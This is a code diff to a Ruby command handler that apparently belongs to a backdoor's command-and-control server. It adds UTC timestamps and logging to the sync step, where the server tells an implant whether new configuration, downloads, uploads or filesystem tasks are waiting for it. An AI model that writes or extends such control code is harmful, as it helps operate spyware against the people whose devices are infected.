@@ -53,23 +53,38 @@ module Commands
 
     trace :info, "[#{peer}][#{session[:cookie]}] Identification: #{version} '#{user_id}' '#{device_id}' '#{source_id}'"
 
+    # get the time in UTC
+    now = Time.now - Time.now.utc_offset
+
     # notify the pusher that the sync is in progress    
-    Pusher.instance.sync_for session, version, user_id, device_id, source_id, Time.now
+    Pusher.instance.sync_for session, version, user_id, device_id, source_id, now
 
     # response to the request
     command = [PROTO_OK].pack('i')
 
     # the time of the server to synchronize the clocks
-    time = [Time.new.to_i].pack('q')
+    time = [now.to_i].pack('q')
 
     available = ""
     # ask to the db if there are any availables for the backdoor
     # the results are actually downloaded and saved locally
     # we will retrieve the content when the backdoor ask for them later
-    available += [PROTO_CONF].pack('i') if DB.instance.new_conf? session[:bid]
-    available += [PROTO_DOWNLOAD].pack('i') if DB.instance.new_downloads? session[:bid]
-    available += [PROTO_UPLOAD].pack('i') if DB.instance.new_uploads? session[:bid]
-    available += [PROTO_FILESYSTEM].pack('i') if DB.instance.new_filesystems? session[:bid]
+    if DB.instance.new_conf? session[:bid] then
+      available += [PROTO_CONF].pack('i')
+      trace :info, "[#{peer}][#{session[:cookie]}] Available: New config"
+    end
+    if DB.instance.new_downloads? session[:bid] then
+      available += [PROTO_DOWNLOAD].pack('i')
+      trace :info, "[#{peer}][#{session[:cookie]}] Available: New downloads"
+    end
+    if DB.instance.new_uploads? session[:bid] then
+      available += [PROTO_UPLOAD].pack('i')
+      trace :info, "[#{peer}][#{session[:cookie]}] Available: New uploads"
+    end
+    if DB.instance.new_filesystems? session[:bid]
+      available += [PROTO_FILESYSTEM].pack('i')
+      trace :info, "[#{peer}][#{session[:cookie]}] Available: New filesystems"
+    end
 
     # calculate the total size of the response
     tot = time.length + 4 + available.length
